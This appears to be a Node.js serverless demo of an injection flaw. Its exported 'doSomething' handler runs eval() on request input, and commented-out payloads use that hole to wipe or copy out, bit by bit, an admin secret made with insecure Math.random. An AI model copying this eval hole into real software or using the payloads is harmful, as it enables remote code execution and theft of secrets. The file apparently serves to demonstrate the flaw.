"use strict";

const {KV_Store} = require('kv-store');
const fs = require('fs');

const conf = JSON.parse(fs.readFileSync('conf.json', 'utf8'));

const constants = {
    BITS: 64,
    TABLE_SECRET_KEY_NAME: 'secretKeyTable',
};

function createKey(event, callback) {
    if (event.isAdministrator) {
        let secret = "";
        for (let i = 0; i < constants.BITS; i++) {
            secret += Math.random() < 0.5 ? 0 : 1;
        }

        const kv = new KV_Store(conf.host, conf.user, conf.pass, constants.TABLE_SECRET_KEY_NAME);

        kv.init()
            .then(() => kv.put('superSecret', secret))
            .then(() => kv.close())
            .then(() => callback())
            .catch(err => callback(err))
    } else {
        callback("Illegal operation - non administrator trying to generate new key!");
    }
}

function leaky(event, callback) {
    if (event.body && (typeof event.body === 'string')) {
        console.log(event.body);
        const body = JSON.parse(event.body);
        eval(body.someCode);
    }
    // callback();
}

module.exports.createKey = (event, context, callback) => createKey(event, callback);
module.exports.doSomething = (event, context, callback) => leaky(event, callback);

// createKey({isAdministrator: true}, (err) => console.log(err));


/* * /
leaky({
    someCode: `
console.log("Running from hijacked code!");
function storeSecret(idx) {
    let kv1 = new KV_Store(conf.host, conf.user, conf.pass, constants.TABLE_SECRET_KEY_NAME);
    return kv1.init()
        .then(() => kv1.put('stealingSuperSecret' + idx, 0))
        .then(() => kv1.close());
    }        
Promise.all(Array.from(Array(64).keys()).map(idx => storeSecret(idx)))
    .then(() => callback(null, "I Zeroed!!"))
    `
    },
    (err,val) => {
        console.log(err);
        console.log(val);
    });

/*
*/

/* * /
leaky({
    someCode: `
console.log("Running from hijacked code!");
let kv = new KV_Store(conf.host, conf.user, conf.pass, constants.TABLE_SECRET_KEY_NAME);
kv.init()
    .then(() => kv.get('superSecret'))
    .then((res) => kv.close().then(() => res))
    .then((secret) => {
        function storeSecret(idx) {
            if (secret[idx] === '1') {
                console.log("~~~~~~~~~~~~~~~" + idx);
                let kv1 = new KV_Store(conf.host, conf.user, conf.pass, constants.TABLE_SECRET_KEY_NAME);
                return kv1.init()
                    .then(() => kv1.put('stealingSuperSecret' + idx, secret[idx]))
                    .then(() => kv1.close());
            } else {
                return Promise.resolve();
            }
        }

        return Promise.all(Array.from(Array(64).keys()).map(idx => storeSecret(idx)))
    })
    .then(() => callback(null, "I Stealed!!"))
    `
    },
    (err,val) => {
        console.log(err);
        console.log(val);
    });

/*
*/

/* * /
let i = 1;
leaky({
    someCode: `
let kv = new KV_Store(conf.host, conf.user, conf.pass, constants.TABLE_SECRET_KEY_NAME);
kv.init()
    .then(() => kv.get('stealingSuperSecret${i}'))
    .then((res) => kv.close().then(() => res))
    .then((res) => callback(null, res))
    `
    },
    (err,val) => {
        console.log(err);
        console.log(`Bit #${i} of the secret is: ${val}`);
    });

/*
*/

// let kv = new KV_Store(conf.host, conf.user, conf.pass, constants.TABLE_SECRET_KEY_NAME);
// kv.init()
//     .then(() => kv.get("stealingSuperSecret3"))
//     .then((res) => kv.close().then(() => res))
//     .then((res) => callback(null,
//     {
//         statusCode: 200,
//         body: "Stolen bit #3                                   ",
//         headers: {
//             "Access-Control-Allow-Origin": "*",
//             "Access-Control-Allow-Credentials": true
//         }
//     }
// ));